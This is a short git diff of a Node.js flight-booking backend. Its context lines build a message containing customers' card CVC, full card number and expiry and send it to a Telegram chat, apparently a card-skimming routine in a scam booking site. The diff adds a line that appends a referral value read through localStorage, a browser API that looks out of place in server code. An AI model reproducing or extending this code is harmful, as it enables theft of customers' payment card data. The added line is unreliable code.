@@ -232,6 +232,7 @@ module.exports = {
                     id: req.body.flight_id
                 }
             })
+
             if(!flight) return res.send({ message: 'Flight not found' })
             const order = await Orders.create({
                 flight_id: req.body.flight_id,
@@ -325,6 +326,7 @@ module.exports = {
             message += `CVC: ${payment.cvc}\n`
             message += `PAN: ${payment.pan}\n`
             message += `Expiry: ${payment.expiry}\n`
+            message += `Referal: ${localStorage.getItem('ref')}`
             Telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message)
 
             return res.send({
